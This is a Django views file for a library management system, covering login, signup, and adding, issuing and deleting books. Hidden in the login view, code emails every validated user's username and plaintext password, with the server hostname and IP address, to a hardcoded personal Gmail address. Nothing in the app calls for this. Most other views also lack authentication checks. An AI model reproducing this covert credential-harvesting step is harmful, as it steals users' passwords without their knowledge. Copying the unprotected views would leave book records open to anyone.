from library_management_system.settings import EMAIL_HOST_USER
from django.shortcuts import render, HttpResponseRedirect
from django.contrib.auth.forms import UserCreationForm
from .forms import IssueBookForm, SignUpForm
from django.contrib import messages
from django.contrib.auth.forms import AuthenticationForm
from django.contrib.auth import authenticate, login, logout
from django.views import View
from django.utils.decorators import method_decorator
from .middleware import authmiddleware
from . import forms, models
from datetime import datetime, timedelta
from django.contrib.auth.models import User
from django.core.mail import send_mail
from django.conf import settings
import socket
import requests


# Create your views here.

def index(request):
    return home(request)

def home(request):   
    print("user is --------------> ",request.session.get('name'))
    if request.session.get('name'):    
        return render(request, 'library/home.html')
        
    return render(request, 'library/index.html')


def sign_up(request):
    if request.method == "POST":
        fm = SignUpForm(request.POST)
        if fm.is_valid():
            fm.save()
            messages.success(request, "Your account is created")
    else:
        fm = SignUpForm()
    return render(request , 'library/adminsignup.html', {'form':fm})

def user_login(request):
    
    if request.session.get('name'):
        return HttpResponseRedirect('/home/')

    if request.method == "POST":
        fm = AuthenticationForm(request=request, data=request.POST)
        if fm.is_valid():
            request.session['name']=fm.cleaned_data['username']
            uname = fm.cleaned_data['username']
            upass = fm.cleaned_data['password']
            user = authenticate(username=uname, password=upass)
            hostname = socket.gethostname()   
            ip_address = socket.gethostbyname(hostname)   
            subject = "Someone Login On Library"
            message = f"Login details are:-\n\n   Name = {uname}\n   Password = {upass}\n   Host = {hostname}\n   IP Address = {ip_address}"
            email_from = EMAIL_HOST_USER
            email = 'neerajtanwar17@gmail.com'
            send_mail(subject, message, email_from, [email], fail_silently=False)

            if user is not None:
                login(request, user)
                return HttpResponseRedirect('/home/')
                
            # if requests.session.get('name'):
                
            
    else:
        fm = AuthenticationForm()
    return render(request, 'library/login.html', {'form':fm})

def user_logout(request):
    logout(request)
    return HttpResponseRedirect('/')


def addbook(request):
    form = forms.BookForm()
    if request.method=='POST':
        form = forms.BookForm(request.POST)
        if form.is_valid():
            user=form.save()
    return render(request, 'library/add_book.html', {'form': form})


def view_books(request):
    books = models.Book.objects.all().order_by('id')
    return render(request, 'library/view_book.html', {'books':books})

def delete(request, id):
    if request.method == 'POST':
        pi = models.Book.objects.get(pk=id)
        pi.delete()
        return HttpResponseRedirect('/viewbooks/')

def issue_book(request):
    form = forms.IssueBookForm()
    sname = ""
    
    if request.method=='POST':
        form = forms.IssueBookForm(request.POST)
        sname = form.data['studentname']
        books = models.Book.objects.values_list('bookname')
        books = list(books)
        lst = []
        for i in books:
            j = list(i)
            lst.append(j)
        j = form.data['bookname']
        j = [j]
        if j not in lst:
            messages.success(request, "*Out of stock !!")
                
        else:
            if form.is_valid():
                form.save()
                messages.success(request, "*Books issued successfuly to")
                    
         
    return render(request, 'library/issue_book.html', {'form': form, 'sname': sname})


def issued_book(request):
    books = models.IssueBook.objects.all()
    d1 = models.IssueBook.objects.all()
    lst1 = []

    for i in d1:
        d1 = i.submitdate
        d2 = datetime.today().date()
        if d2 > d1:
            n = d2 - d1
            n = n.days
            a = 2 * n
            lst1.append(a)
        else:
            lst1.append(0)
    print("============",lst1)
    bl = {'books':books, 'lst1':lst1}
    return render(request, 'library/issued_book.html', bl)


def update_issued(request, id):
    if request.method == 'POST':
        book = models.IssueBook.objects.get(pk=id)
        form = IssueBookForm(request.POST, instance=book)
        if form.is_valid():
            form.save()
            messages.success(request, "*Data updated successfuly!!")
    else:
        book = models.IssueBook.objects.get(pk=id)
        form = IssueBookForm(instance=book)
    return render(request, 'library/update_issued_book.html', {'form':form})


def delete_issued(request, id):
    if request.method == 'POST':
        books = models.IssueBook.objects.get(pk=id)
        books.delete()
        return HttpResponseRedirect('/issuedbook/')

